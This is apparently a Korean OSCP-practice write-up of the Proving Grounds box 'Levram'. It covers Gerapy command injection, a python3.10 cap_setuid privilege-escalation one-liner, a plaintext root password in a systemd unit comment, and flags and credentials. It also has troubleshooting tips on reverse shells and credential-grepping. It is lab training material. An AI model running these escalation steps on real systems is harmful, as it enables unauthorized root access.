> [!warning] linpeas 는 시험 허용 도구다 — 그런데 이전 판본은 도구 목록에서 통째로 지우고
> 그 자리에 실측하지 않은 `getcap -r /` 6행 출력을 지어 넣었다(snap 리비전 번호까지 구체적으로).
> 규정 문제가 아니라 기록 문제다. 실제로 쓴 도구를 지우고 안 쓴 절차를 넣으면 다음 세션이 "이 박스는 수동 열거로 풀렸다"고 오판한다.
> `linpeas`/`LinEnum`/`pspy` 는 열거 전용이라 OSCP에서 허용된다([[_WRITEUP-STANDARD]] 참조). 숨길 이유가 없다.

수동 대안도 병기해 둔다. 시험에서 linpeas를 못 쓰는 상황(전송 불가·탐지)을 대비한 것이고, 아래는 이 박스에서 실행한 기록이 없는 절차이므로 출력을 붙이지 않는다:

```bash
getcap -r / 2>/dev/null          # 전체 파일시스템에서 capability 보유 파일 열거
getcap -r /usr /opt /home 2>/dev/null   # 느리면 관심 경로만
```

일반적인 Ubuntu 데스크톱/서버에서 `getcap` 은 정상 항목이 섞여 나온다. 골라내는 기준:

| 보이는 것 | 판정 | 근거 |
|---|---|---|
| `ping cap_net_raw=ep` (snap 사본까지 중복으로 뜬다) | 정상 | 현대 배포판이 `ping`의 SUID를 대체한 표준 설정 |
| `mtr-packet cap_net_raw=ep` | 정상 | mtr의 백엔드 — ping과 같은 이유 |
| `gst-ptp-helper cap_net_bind_service,cap_net_admin=ep` | 정상 | GStreamer PTP 시각 동기화 헬퍼. 패키지 기본값 |
| `python3.10 cap_setuid=ep` ← 이 박스 | **비정상** | ① capability가 네트워크 계열이 아니고 ② 대상이 인터프리터다 |

외울 규칙은 둘이다. `cap_net_*` 는 거의 항상 노이즈이고 그 외(`setuid`·`setgid`·`dac_*`·`sys_*`·`chown`)가 보이면 정답 후보다. 그리고 대상이 인터프리터·아카이버·디버거면 무조건 후보로 본다 — `python`·`perl`·`ruby`·`node`·`php`·`tar`·`rsync`·`gdb`·`openssl`·`vim`.

`[가정]` 위 표의 "정상" 행들은 이 박스의 실측 출력이 아니라 Ubuntu 22.04 패키지 기본값에서 온 일반 지식이다. 이 박스에서 확정된 것은 `/usr/bin/python3.10 cap_setuid=ep` 하나다.

```bash
app@ubuntu:~$ /usr/bin/python3.10 -c "import os;os.setuid(0);os.system('/bin/bash')"
root@ubuntu:~/gerapy# id
uid=0(root) gid=1000(app) groups=1000(app)
```

**`os.setgid(0)` 을 같이 넣으면 실패한다.**

```
PermissionError: [Errno 1] Operation not permitted
```

붙어 있는 capability는 `cap_setuid` 하나뿐이라 gid는 못 바꾼다. GTFOBins 원문 그대로 `setuid` 만 호출할 것. 결과적으로 `gid=1000(app)` 이 남는다 — `proof.txt` 를 읽기엔 충분하지만 깨끗한 root 컨텍스트는 아니다.

일반화하면, **capability는 정확히 부여된 것만 쓸 수 있다.** `os.setgid(0)` 은 `CAP_SETGID` 를 요구하는데 부여된 것은 `CAP_SETUID` 뿐이라 `EPERM` 이다. GTFOBins의 `cap_setuid` 항목이 `setuid` 만 부르는 것은 간결하게 쓴 게 아니라 그것이 정확한 최대치이기 때문이다. "더 완전해 보이도록" 원문에 `setgid`·`setgroups` 를 덧붙이면 되던 것이 안 되고 원인을 엉뚱한 데서 찾게 된다. 같은 이유로 `cap_dac_read_search` 가 있다고 파일을 *쓰려* 하면 안 된다 — 그건 `cap_dac_override` 다.

### 4-4. Privesc B — systemd 유닛 파일의 평문 비밀번호

`/etc/systemd/system/*.service` 는 기본이 world-readable이다. **셸을 잡으면 반사적으로 훑는다.**

```bash
app@ubuntu:~$ cat /etc/systemd/system/app.service
[Unit]
Description=Gerapy app service

# root:4!m?C%7k@Xb?XNH0!>6K          ← 주석에 root 비밀번호

[Service]
User=app
Type=simple
ExecStart=/bin/bash /home/app/run.sh

[Install]
WantedBy=multi-user.target
```

유닛 파일에서 항상 읽는 네 줄:

| 지시자 | 왜 보는가 |
|---|---|
| `User=` | 비어 있으면 root로 돈다 — 그 서비스를 뚫으면 곧바로 root ([[Hub]]·[[Hawat]] 패턴). 여기는 `User=app` 이라 해당 없음 |
| `ExecStart=` | 가리키는 스크립트가 쓰기 가능하면 그 자체가 권한상승 경로다. `/home/app/run.sh` 는 `app` 소유일 가능성이 높지만 서비스도 `app` 으로 돌아 이득이 없다 |
| `Environment=` / `EnvironmentFile=` | 자격증명이 여기 박힌다 |
| 주석(`#`) | ← 이 박스의 정답. 관리자가 메모를 남기는 자리다 |

열거 명령: `cat /etc/systemd/system/*.service`, `systemctl cat <서비스>`, `grep -rIn -iE 'pass|pwd|secret|token|key' /etc/systemd/ 2>/dev/null`

```bash
app@ubuntu:~$ su root
Password:
root@ubuntu:/home/app/gerapy# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/app/gerapy# cat /root/proof.txt
aaa7973d6eecab6c5268390c53579801
```

입력값: `4!m?C%7k@Xb?XNH0!>6K` (`/etc/systemd/system/app.service` 주석에서 얻은 그 값)

> [!danger] `Password:` 뒤가 비어 있는가 아닌가는 pty 유무로 갈린다 — 이 노트가 한 번 틀리게 단정한 자리다
> pty가 있을 때: `su`·`sudo`·`ssh`·`passwd` 는 비밀번호를 읽기 직전 터미널을 noecho 모드로 바꾼다(`tcsetattr` 로 `ECHO` 플래그를 끈다). 입력한 문자는 화면에도, `script`/`tmux capture-pane` 캡처에도 남지 않는다. `Password:` 뒤가 비어 있는 것이 정상이다.
> pty가 없을 때(업그레이드 안 된 리버스셸): 원격에는 끌 터미널이 없다. 타이핑한 문자는 내 쪽 로컬 터미널이 에코해 버리므로 비밀번호가 트랜스크립트에 그대로 남는다. `su` 가 에코를 끄지 못한 것이 아니라 끌 대상이 내 화면에 없었던 것이다.
>
> > [!warning] 정정 — 원 지적("`su` 는 에코를 끄므로 화면에 절대 안 나온다")은 **절반만 맞다**
> > **이전 판본의** `su root` 블록에 비밀번호가 찍혀 있던 것은 한때 **조작 증거**로 읽혔다. 그런데 **다른 박스([[plum]]) 검증에서 "`su` 는 TTY 를 요구한다"가 거짓임이 실측**됐다 — TTY 가 없어도 `su` 는 stdin 에서 비밀번호를 읽고, 그래서 화면에 남는다.
> > 즉 이 박스에서 비밀번호가 찍혀 있던 것은 **두 해석이 모두 가능하다**:
> > ① 노트를 쓰면서 가독성을 위해 덧붙인 것(조작) — ② **pty 업그레이드 없이 `su` 를 쳤다는 증거**(로컬 에코).
> > `[가정]` **어느 쪽인지 확정할 수 없다.** 원본 캡처가 남아 있지 않고, `pathB.sh` 는 `tmux send-keys -l` 로 밀어 넣어 재현해도 로컬 에코 여부가 당시와 같다는 보장이 없다.
> > **확정할 수 없으므로 위 블록은 pty 있는 경우(에코 없음)로 적어 뒀다.** 재현할 사람은 자기 셸에 pty가 있는지부터 확인하라 — `tty` 가 `not a tty` 면 화면에 남는다.
>
> 이 박스를 자동화한 `~/PG/Levram/pathB.sh` 는 화면에 치는 것이 아니라 키를 밀어 넣는다:
> ```bash
> tmux send-keys -t levram "su root" Enter
> sleep 3
> tmux send-keys -t levram -l "$PW"     # -l = 리터럴 전송
> tmux send-keys -t levram Enter
> ```
> 시험 함의 셋: ① pty가 있으면 스크린샷 증거에 비밀번호가 안 찍히므로 자격증명은 따로 기록해야 한다. ② 화면에 아무것도 안 나온다고 "입력이 안 먹었다"고 판단하지 마라 — 흔한 오판이다. 그냥 치고 Enter를 누른다. ③ 반대로 pty 없이 쳤다면 비밀번호가 보고서 캡처에 남으니 제출 전에 지운다.

> [!warning] ~~`su`는 TTY를 요구한다~~ — 반증됨 (2026-08-20, [[plum]] 실측)
> 이전 판본은 "업그레이드 안 된 리버스셸에서 `su`를 치면 `su: must be run from a terminal` 이 난다"고 단정했다. [[plum]] 검증에서 TTY 없이도 `su` 가 stdin 에서 비밀번호를 읽고 인증에 성공하는 것이 실측됐다. 반사적으로 믿을 규칙이 아니다.
> `[가정]` 그 에러 자체가 존재하지 않는다는 뜻은 아니다 — 구현·배포판·`PAM` 설정에 따라 나오는 환경이 있다. "항상 난다"가 거짓인 것이지 "절대 안 난다"가 참인 것이 아니다.
>
> 그래도 pty는 먼저 잡는 편이 낫다. 이유가 바뀌었을 뿐이다 — `su` 가 막혀서가 아니라 pty 없이 치면 비밀번호가 트랜스크립트에 남고 이후 `sudo`·에디터·`less` 가 전부 불편해진다. `python3 -c 'import pty;pty.spawn("/bin/bash")'` 는 어차피 10초다.
> 그리고 `must be run from a terminal` 이 실제로 떴을 때 "비밀번호가 틀렸다"고 오판하지 마라 — 멀쩡한 자격증명을 버리게 된다.

B가 A보다 낫다. uid/gid/groups 전부 0인 완전한 root 컨텍스트이기 때문이다. A는 `gid=1000(app)` 이 남는 반쪽이었다.

> [!warning] "같은 비밀번호로 SSH 직접 로그인이 된다"는 확인하지 않았다 `[가정]`
> 이전 판본은 여기에 `ssh root@192.168.248.24` → `cat proof.txt` 트랜스크립트를 붙여두고, 그것을 근거로 "재접속 비용 0", "6장 ⑤의 소득", "8장 `PermitRootLogin` 권고"까지 다섯 군데를 지탱했다. SSH 세션 기록이 산출물 어디에도 없다. `proof.txt` 값은 위 `su root` 경로에서 얻은 것이다.
>
> 그리고 성립 여부가 자명하지도 않다 — Ubuntu 22.04 sshd 기본값은 `PermitRootLogin prohibit-password` 다. 비밀번호로 root SSH가 되려면 `sshd_config` 가 명시적으로 바뀌어 있어야 하는데 그 파일을 확인하지 않았다. 확인했다면 `grep -i permitrootlogin /etc/ssh/sshd_config` 한 줄이었다.
>
> "root 비밀번호를 얻었으니 SSH도 되겠지"는 그럴듯하지만 배포판 기본값이 반대 방향이다. **자격증명을 얻으면 재사용 가능한 채널을 실제로 열어보고, 안 열어봤으면 안 열어봤다고 적어라.**

### 4-5. 두 경로 비교 — "root가 됐다"가 아니라 "안정적인가"

| | A — cap_setuid | B — 평문 비밀번호 |
|---|---|---|
| 결과 컨텍스트 | `uid=0 gid=1000(app)` — 반쪽 | `uid=0 gid=0 groups=0` — 완전 |
| `proof.txt` 읽기 | 가능 | 가능 |
| gid 기반 접근 제어 통과 | 불가 (예: `shadow`·`docker` 그룹 전용 리소스) | 가능 |
| 리버스셸이 끊기면 | 처음부터 다시 (웹 → 주입 → 셸 → capability) | 웹 주입으로 `app` 셸만 되찾으면 `su root` 한 줄. SSH 재접속은 미검증 `[가정]` |
| 랩 리버트 후 재현 | 재현 가능 | 재현 가능 |
| 시험 증거 촬영 | 가능하나 `id`가 지저분하다 | 깔끔하다 |

시험에서 경로가 둘이면 재접속 비용으로 고른다. 24시간 시험에서 진짜 비용은 셸을 얻는 것이 아니라 셸을 잃고 다시 얻는 것이다. 자격증명(비밀번호·SSH 키)을 주는 경로가 우선이고 익스플로잇 체인에 의존하는 경로는 차선이며, 둘 다 확인해서 둘 다 기록한다 — 한쪽이 리버트 후 안 통할 수 있다.

단 "자격증명을 얻었다"와 "재접속 채널이 열렸다"는 다르다. 비밀번호는 그 자체로 채널이 아니고, 어느 서비스가 그 비밀번호를 받아주는지는 설정에 달렸다(sshd의 `PermitRootLogin`, PAM, 계정 잠금). 이 박스가 그 구분을 흐린 사례다 — 비밀번호를 얻자마자 "SSH 재접속 확보"로 적었지만 실제로 접속해보지 않았다. 확인 비용은 두 줄이다: `grep -i permitrootlogin /etc/ssh/sshd_config` 와 `ssh root@TARGET` 을 실제로 한 번 던져보는 것.

---

## 5. 플래그 / 자격증명

| | |
|---|---|
| `local.txt` | `367447fc2401d598d4368ed12eb7ca2d` |
| `proof.txt` | `aaa7973d6eecab6c5268390c53579801` |

| 대상 | 자격증명 |
|---|---|
| Gerapy 웹 UI (8000) | `admin` / `admin` |
| 시스템 root | `root` / `4!m?C%7k@Xb?XNH0!>6K` (`app.service` 주석. `su root` 로 검증됨. SSH 재사용은 미검증 `[가정]`) |
| API 토큰 | 세션마다 달라진다. 하드코딩하지 말고 매번 뽑을 것 (1-4) |

> [!tip] 시험 증거 형식 연습
> 시험에서는 플래그 값만으로는 인정되지 않는다. 한 화면에 담아야 한다:
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스는 경로 B로 잡은 root 셸에서 찍는 것이 맞다 — A로 찍으면 `id` 에 `gid=1000(app)` 이 남아 채점자에게 설명이 필요해진다.
> `local.txt` 도 `app` 셸에서 동일 형식으로 한 번 더 찍는다.

---

## 6. 막혔던 지점 / 시행착오

### ① EDB 50640이 `IndexError`로 즉사했다 — 실제로 겪음

`searchsploit -m 50640` 으로 받아 그대로 돌리자 프로젝트 목록을 읽는 지점에서 터졌다. 스크립트는 `/api/project/index` 응답에서 `dict3[0]['name']` 을 꺼내는데 Levram에는 프로젝트가 0개다.

- **잘못된 결론**: "타겟이 취약하지 않다" 또는 "익스플로잇이 이 버전에 안 맞는다"
- **실제 원인**: 스크립트가 암묵적 전제(프로젝트 최소 1개)를 깔고 있었다
- **어떻게 알아챘는가**: 예외가 HTTP 응답이 아니라 **파이썬 트레이스백**이었다. 타겟이 거부한 것이 아니라 로컬 스크립트가 자기 데이터 처리에서 죽은 것이다

**예외의 발생 위치가 곧 진단이다:**

| 증상 | 의미 |
|---|---|
| 타겟이 `401`/`403`/`404` 반환 | 인증·경로 문제. 익스플로잇 이전 단계 |
| 타겟이 `500` 반환 | 주입은 도달했으나 페이로드가 깨졌다 — 좋은 신호다 |
| 로컬 파이썬 트레이스백 | **타겟과 무관.** 스크립트를 읽어라 |
| 무응답/타임아웃 | 아웃바운드 차단 또는 페이로드가 셸을 블로킹 |

해법은 스크립트 고치기가 아니라 **전제 만들어주기**였다. `POST /api/project/create` 로 프로젝트 `pwn` 을 하나 만들면 `[0]` 이 더 이상 터지지 않는다. 스크립트를 디버깅하는 것보다 환경을 스크립트가 기대하는 모양으로 맞춰주는 편이 훨씬 빠르다.

그리고 실제로 셸을 잡은 것은 스크립트가 아니라 수동 `curl`(`~/PG/Levram/trigger.sh`)이었다. 스크립트를 살려두는 것과 스크립트로 뚫는 것은 별개이고, 전제를 만들어준 뒤에도 수동 경로가 더 빨랐다.

> [!danger] 이 항목이 이 노트를 통째로 오염시킨 발원지다
> 여기까지는 정확하다. 문제는 이전 판본이 한 걸음 더 나가 "그러니까 프로젝트 생성은 취약점의 선행조건"이라고 승격시킨 것이다.
> 취약 코드에는 그런 검사가 없다(2-6). 스크립트의 성질을 취약점의 성질로 옮겨 적은 것이고, 그 한 번의 승격이 상단 요약·2-6·3장·6장 ④·7-1 다섯 군데로 번졌다.
> [[_WRITEUP-STANDARD]]가 경고하는 형태 그대로다 — "이 박스가 이랬으니 일반적으로 이렇다"로 승격하는 문장. **일반화의 근거는 이 박스의 관측이 아니라 별도 확인이어야 한다.**

공개 익스플로잇을 돌리기 전 30초 읽기 체크리스트:

1. 하드코딩된 값 — 포트·경로·URL 프리픽스·`http`/`https`
2. **암묵적 전제** — 목록의 `[0]`, "적어도 하나 존재", 특정 설정 활성화 ← 이 박스의 함정
3. 인증 흐름 — 토큰을 어디서 얻고 어느 헤더에 넣는가
4. 페이로드 생성 지점 — 내 IP/포트가 실제로 어디 들어가는가
5. 버전 가드 — 스크립트가 버전을 확인하고 거부하는가

### ② 푸터 버전 문자열을 판정 근거로 세지 않았다 — 실제로 조작된 값이었다

`Gerapy v0.9.7` 이라는 푸터가 있었다. 이것만 보고 넘어갔어도 결과적으로는 맞았을 것이다. 판정에 세지 않은 것은 옳은 절차다 — 텍스트 한 줄은 위조 비용이 0이고, [[Hub]]에서 정확히 그렇게 틀렸다.

그리고 이 박스에서는 그 절차가 실제로 값을 했다. 정품 0.9.7 wheel 을 꺼내 대조하니:

- 파일 크기 26541(서빙본) vs 26533(정품) — **8바이트 차이**
- 정품 번들에 `Gerapy v0.9.7` 문자열은 **0건**, 푸터 원문은 `Gerapy All Rights Reserved.`
- 덤으로 `lang:"zh"` → `"en"` 편집까지 확인

→ **이 푸터는 정품 산출물이 아니라 출제자가 삽입한 것이다.** 값이 맞았던 것은 출제자가 굳이 틀리게 심지 않았기 때문이지 이 근거가 믿을 만해서가 아니다. `v0.9.9` 를 심어 뒀다면 푸터만 본 사람은 "패치됨"으로 판단하고 박스를 통째로 버렸을 것이다.

> [!note] 이 관측은 한 번 "날조"로 판정돼 삭제됐다가 철회·복원됐다 (2026-08-20)
> 적대적 검증자가 `~/PG/` 와 `/tmp/gv/` 만 보고 "정품 wheel 을 받은 기록이 없다"며 절 전체를 지웠다. `pip` 의 HTTP 캐시(`~/.cache/pip/http-v2/…/*.body`)에 wheel 이 그대로 있었고, 캐시 wheel 로 재대조하니 위 수치가 전부 맞았다(1-2 재현 절차).
> 비용은 정품 wheel 확보와 크기·문자열 대조로 몇 분. 판정에 필요한 작업은 아니었고(증거 A에서 이미 끝나 있었다) 부산물이 값졌을 뿐이다.

남는 교훈은 둘이다. 조작 가능한 단일 근거로 판정하지 않는다는 것 — 이 박스는 그 규율이 옳았음을 사후에 증명해준 드문 사례이고, 보통은 조작 여부를 영영 모른 채 넘어간다. 그리고 "조작됐음을 확인했다"고 쓰려면 대조본과 재현 경로를 함께 적어야 한다는 것. 이 노트는 대조는 했는데 경로를 안 적어서 한 번 통째로 지워졌다. **결론만 적힌 관측은 자기 자신을 방어하지 못한다.**

### ③ `os.setgid(0)`을 덧붙였다가 `EPERM` — 실제로 겪음

GTFOBins의 `cap_setuid` 원문은 `os.setuid(0)`만 부른다. "더 완전한 root가 되겠지" 하며 `os.setgid(0)`을 붙여 돌린 것이 산출물에 남아 있다 — `~/PG/Levram/pathA2.txt`:

```
/usr/bin/python3.10 -c "import os;os.setuid(0);os.setgid(0);os.system('/bin/bash')"
```

- **순서 주의**: `setuid` 가 먼저다(이전 판본은 "`setgid` 를 앞에 넣었다"고 적었는데 산출물과 어긋난다). 순서와 무관하게 `setgid` 호출에서 막힌다
- **원인**: `setgid` 는 `CAP_SETGID` 를 요구한다. 부여된 것은 `cap_setuid` 하나뿐이다 → `PermissionError: [Errno 1] Operation not permitted`
- `[가정]` 에러 원문 출력 로그는 남아 있지 않다. 위 문구는 `os.setgid` 가 `EPERM` 일 때 CPython이 내는 표준 형태이지 이 박스의 캡처가 아니다
- 정답은 바로 다음 파일에 있다 — `pathA3.txt` 가 `setgid` 를 빼고 `os.setuid(0)` 만 남긴 GTFOBins 원문이다
- **오진 위험**: 이 에러를 보고 "capability 경로가 안 통한다"고 판단하면 멀쩡한 권한상승을 통째로 버린다
- 교훈: **GTFOBins 원문을 임의로 "보강"하지 마라.** 그 한 줄이 정확히 그 capability의 최대치다

### ④ 브리핑 문구가 주입 지점을 잘못 가리켰다 — 실제로 겪음

PG 브리핑은 "프로젝트 생성 기능을 통해 명령이 실행된다"고 적혀 있다. 문자 그대로 읽으면 `/api/project/create` 의 `name`·`description` 에 주입을 시도하게 된다.

**실제 주입 지점은 `/api/project/<name>/parse` 의 `spider` 다.** 생성은 취약점과 무관한 편의 단계다(2-6).

힌트·브리핑·CVE 요약문에는 압축 손실이 있다. "프로젝트 생성 기능을 통해"는 공격 사슬을 한 문장으로 줄이다 보니 무관한 준비 단계와 주입 지점이 뭉개진 표현이다. **1차 자료(패치 커밋·익스플로잇 코드·URLconf 덤프)가 요약문을 이긴다.** 여기서는 404가 뱉어준 `^api/project/(\S+)/parse` 가 브리핑보다 정확했다.

### ⑤ 첫 root에서 멈추지 않은 것이 정답이었다 — 실제로 겪음

경로 A(`cap_setuid`)로 이미 `root@ubuntu#` 프롬프트를 잡았다. 여기서 `proof.txt` 를 읽고 박스를 닫아도 점수는 같다. 그런데 `id` 가 이렇게 나왔다:

```
uid=0(root) gid=1000(app) groups=1000(app)
```

- **무엇이 걸렸는가**: `uid=0` 인데 `gid` 와 `groups` 가 `app` 이다. **완전한 root 컨텍스트가 아니다**
- **왜 계속 팠는가**: ① 시험 증거 스크린샷에 `gid=1000(app)` 이 찍히면 설명이 필요해진다 ② 리버스셸이 끊기면 웹 익스플로잇부터 전부 다시 해야 한다
- **소득**: `/etc/systemd/system/app.service` 주석에서 평문 root 비밀번호 → `su root` 로 완전한 root 컨텍스트(`uid=0 gid=0 groups=0`)
- **소득이 아니었던 것**: 이전 판본은 여기에 "+ SSH 재접속 경로"를 덧붙였다. SSH는 시도하지 않았다(4-4). 얻은 것은 비밀번호이지 검증된 채널이 아니다 `[가정]`

**"root가 됐다"는 종료 조건이 아니다.** 종료 조건은 끊겨도 1분 안에 돌아올 수 있는가다. `id` 출력이 `uid=0 gid=0 groups=0` 이 아니면 아직 반쪽이고, 자격증명(비밀번호·SSH 키·`/etc/shadow` 해시)을 확보하지 못했으면 발판이 아니라 외줄이다. root를 잡은 직후에도 최소 3분은 더 쓴다 — `cat /etc/shadow`, `ls -la /root/.ssh/`, `history`, `/etc/systemd/system/*.service`, `.env`·백업 파일.

그 3분에 하나 더 넣는다. **얻은 자격증명으로 실제 재접속을 한 번 해본다.** 이 박스가 빠뜨린 단계이고, 빠뜨린 채로 "재접속 경로 확보"라고 적었다. 확보는 접속이 성공했을 때 쓰는 말이다.

### ⑥ `/root/email3.txt`를 열지 않기로 판단했다 — [가정] 항목 전체가 미검증이다

> [!warning] 이 항목은 "실제로 겪음"으로 프레이밍할 근거가 없다
> `/root` 디렉터리 목록 산출물이 남아 있지 않다. "`email3.txt` 가 있었다", "8바이트였다"는 관측 기록이 아니라 이전 세션의 기억에서 온 서술이다 `[가정]`. 타겟이 정지돼 재확인도 불가능하다.
> 아래 판단 근거는 그 전제가 참이라면 성립하는 추론이다.

- **판단 근거**: 8바이트는 플래그(32자 MD5) 크기가 아니다. 파일명도 스토리 소품 계열이다
- **[가정]** 실제로 열어 확인한 기록이 없으므로, "무관하다"는 것은 크기와 이름에서 나온 추론이다

**이 판단은 시험에서는 뒤집어야 한다.** 랩에서는 "플래그와 무관해 보이면 넘어간다"가 효율이지만 시험에서는 `cat` 한 번이 1초다. `/root`·`/home/*` 의 모든 파일은 일단 다 읽는다 — 8바이트짜리가 다른 호스트의 비밀번호인 경우가 실제로 있다. 비용이 1초인 확인은 "무관해 보인다"는 이유로 생략하지 않는다. 생략의 기대손실이 확인 비용보다 항상 크다.

### ⑦ 이 유형에서 흔히 막히는 지점

> [!note] 아래는 이 박스의 실제 시행착오가 아니다
> 원문 노트에 기록이 없어 재현 검증이 불가능하다. 동일 유형(관리 UI + 인증 후 명령주입 + capability privesc)에서 반복적으로 시간을 잡아먹는 지점을 일반화해 적는다. `[가정]`

| 증상 | 흔한 원인 | 확인/해법 |
|---|---|---|
| 모든 API가 401 | `Bearer`를 붙였다 | DRF는 **`Token`** 스킴 (1-4 참조) |
| 400 / "필수 필드 누락" | `Content-Type` 누락 (단 이 박스의 두 엔드포인트는 무관, 3장) | `-H 'Content-Type: application/json'`. 안 고쳐지면 바디 형식을 의심 |
| 500 `JSONDecodeError` | 뷰가 `json.loads(request.body)` 로 직접 읽는데 바디가 JSON이 아니다 | 헤더가 아니라 바디를 고친다 |
| 주입 페이로드에 아무 반응 없음 | **dash가 `/dev/tcp`를 모른다** | `/bin/bash -c '...'` 로 감싸기 (2-5) |
| 백틱이 통째로 문자열로 남음 | JSON 층에서 이스케이프됨 / URL 인코딩 이중 적용 | `--data-urlencode` 또는 base64 래핑 |
| 응답이 오래 걸리다 타임아웃 | 리버스셸이 붙어서 요청 핸들러가 안 끝난 것 | **정상이다.** 리스너를 확인하라 |
| 리버스셸이 안 붙음 | 아웃바운드 필터 | 443·80·53으로 포트 변경. 이 박스는 4444가 그대로 통했다 |
| `getcap` 결과가 비어 보임 | `2>/dev/null` 없이 에러에 파묻힘 / `PATH`에 없음 | `getcap -r / 2>/dev/null`. `command not found` 면 `/usr/sbin/getcap` 를 절대경로로 (일반 사용자 `PATH`에 `/usr/sbin` 이 없는 배포판이 있다) |
| `getcap` 이 정말 미설치 (`libcap2-bin` 없음) | 대체 명령이 아니라 다른 채널이 필요하다 | `find / -type f -exec getcap {} \;` 는 답이 아니다 — `getcap` 이 없으면 `-exec getcap` 도 없다. 그건 `-r` 재귀를 지원하지 않는 구형 libcap 용 우회다. 진짜 대안: linpeas 를 올려 돌리거나, `for f in $(find / -type f -perm -u+x 2>/dev/null); do getfattr -n security.capability "$f" 2>/dev/null; done` 로 확장속성을 직접 읽거나, `/usr/sbin/getcap` 바이너리를 Kali에서 전송한다 |
| `su`가 "must be run from a terminal" | pty 없음 | `python3 -c 'import pty;pty.spawn("/bin/bash")'` 먼저 (4-4). 단 이 에러가 항상 나는 것은 아니다 — TTY 없이도 `su` 가 통하는 환경이 있다([[plum]] 실측). 에러가 안 났다고 pty가 있는 것이 아니다 |
| `DEBUG=True`인데 404가 예쁜 페이지 | 커스텀 `handler404` 또는 `DEBUG=False` | 존재하는 뷰에 **잘못된 타입**을 넣어 500을 유발해본다 |
| 프로젝트 생성은 200인데 `parse`가 404 | 프로젝트 이름 URL 인코딩 / 이름에 특수문자 | 이름은 `pwn`처럼 영숫자로만 |
| 두 번째 시도부터 리버스셸이 안 붙음 | 앞선 요청의 핸들러가 셸을 물고 있다 | 리스너 포트를 바꿔 재시도 `[가정]` — 이 박스에서 겪은 일이 아니다. 산출물(`trigger.sh`)과 이전 세션 기록 모두 4444 하나뿐이고, "4445"는 이전 판본이 자기 본문에서 만들어낸 값이다 |

### ⑧ 시간 배분 — 어디에 썼고 어디서 손절했어야 하는가

| 단계 | 성격 | 손절선 |
|---|---|---|
| Nmap `-p-` | 필수 | — |
| 404 URLconf 덤프 확인 | 10초, 최고 ROI | 여기서 라우팅을 얻으면 디렉터리 브루트포싱은 하지 않는다 |
| 기본 자격증명 시도 | 1분 | `admin:admin`·`admin:password`·제품명 조합. 5개 안에 안 되면 다음으로 |
| 버전 판정(증거 A) | sdist 6종 다운로드 + `md5sum` 대조 | 적정선이다. "0.9.8 미만인가"만 확인하면 되고 실제로 그렇게 끝났다 |
| 버전 판정(증거 B) | 초과 작업 — wheel 확보 + 자산 30개 대조 + 크기/문자열 대조 | 여기서 멈췄어야 했다. A에서 이미 "세 후보 전부 취약"이 나왔다. 얻은 것은 정밀도와 푸터 조작 발견이고, 비용은 이 박스 단일 최장 구간이다 |
| EDB 50640 디버깅 | 잘못된 방향 — 4분 만에 접었다 | 트레이스백이 로컬이면 스크립트를 읽는다. 10분 넘기면 `curl` 수동으로 전환 |
| 수동 `curl` 주입 | 정답 | — |
| capability privesc (linpeas) | 2분 | 셸 잡고 나서 linpeas 한 방 또는 열거 6줄 |
| `app.service` 발견 | 30초 | 위와 동일 |

> [!danger] 이 박스의 실제 소요는 8분이었다 — mtime 이 전 과정을 그대로 재구성한다
> Kali 산출물의 mtime을 나열하면 전 과정이 그대로 재구성된다:
> ```
> 17:29:01  nmap.log / nmap.stdout        ← 정찰 종료
> 17:29:45  50640.py                       ← searchsploit
> ~17:30    gerapy-0.9.{5,6,7,8,9,11}.tar.gz 일괄  ← 버전 판정 (증거 A)
>           + gerapy wheel(pip HTTP 캐시에 잔존)   ← 버전 판정 (증거 B)
> 17:33:47  trigger.sh                     ← 수동 주입 → 셸
> 17:34:29  run.sh
> 17:35:52  pathA.txt / runf.sh            ← capability privesc
> 17:36:07  pathA2.txt                     ← setgid 시도 (실패)
> 17:36:25  pathA3.txt                     ← setuid만 (성공)
> 17:37:06  pathB.sh                       ← su root
> ```
> `50640.py`(17:29:45)와 `trigger.sh`(17:33:47) 사이의 4분 2초가 이 박스의 단일 최장 구간이고, 그 안에 들어간 것이 sdist 다운로드 + `md5sum` 대조(증거 A) + wheel 확보와 자산 30개 대조(증거 B) + EDB 50640 시도다. 비교 기준으로 nmap `-p-` 전체가 42.07초였으니 버전 판정 창이 정찰 전체의 5배 이상이었다.
> `[가정]` 4분 창 안에서 증거 A / 증거 B / EDB 시도가 각각 몇 초씩이었는지는 파일 mtime으로 분해되지 않는다. 구간 전체가 최장이라는 것까지가 실측이다.
>
> 그래서 노트의 원래 자기평가가 옳다 — "가장 오래 걸린 구간"이 버전 판정이고, "시간을 태운 판단 1개"는 증거 B까지 간 것이다.
>
> 남는 교훈은 이것이다. 정밀도와 속도는 트레이드오프이고 시험에서는 "패치 경계의 어느 쪽인가"만 정하고 즉시 넘어간다. 이 박스는 그러지 않았다 — 8분에 끝났으니 손해가 눈에 안 보였을 뿐, 같은 습관을 24시간 시험에 들고 가면 그대로 비용이 된다.

시간을 벌어준 판단 3개는 다음 박스에서도 그대로 재사용할 것이다:

1. 404 본문을 눈으로 읽었다. 스캐너를 돌리기 전에 한 번 읽은 덕에 열거 단계가 통째로 사라졌다.
2. 익스플로잇이 죽었을 때 타겟이 아니라 스크립트를 의심했다. 트레이스백의 발생 위치가 진단이었다. 그리고 스크립트를 고치는 대신 수동 `curl` 로 갈아탔다 — 17:29:45에 받은 50640.py 를 붙들지 않고 17:33:47에 `trigger.sh` 로 넘어간 것이 4분 만에 셸을 만든 이유다.
3. 첫 root에서 멈추지 않았다. 1분을 더 써서(`17:36:25` → `17:37:06`) 완전한 root 컨텍스트를 얻었다.

시간을 태운 판단은 증거 B까지 간 것 하나다. 증거 A가 `{0.9.5, 0.9.6, 0.9.7}` 을 내놓은 시점에 세 후보 전부 취약이므로 판정은 끝나 있었다. wheel 을 확보해 자산 30개를 대조하고 크기까지 비교한 것은 정밀도를 위한 초과 작업이다. 부산물(푸터 조작 발견)이 값졌지만 그건 사후 운이고, 시험 시계에서는 판정이 끝났으면 멈추는 것이 규칙이다.
`pathA2.txt` 의 `setgid` 보강 시도(20초)는 시간 낭비 목록에 넣지 않는다 — 오히려 좋은 실패다(6장 ③). GTFOBins 원문의 최소성이 왜 최소인지를 알려줬다.

---

## 7. OSCP 시험 관점

### 7-1. 시험 금지 도구 점검

> [!danger] 이 박스에서 시험 금지 도구를 쓴 곳은 없다 — 다만 경계를 알고 있어야 한다
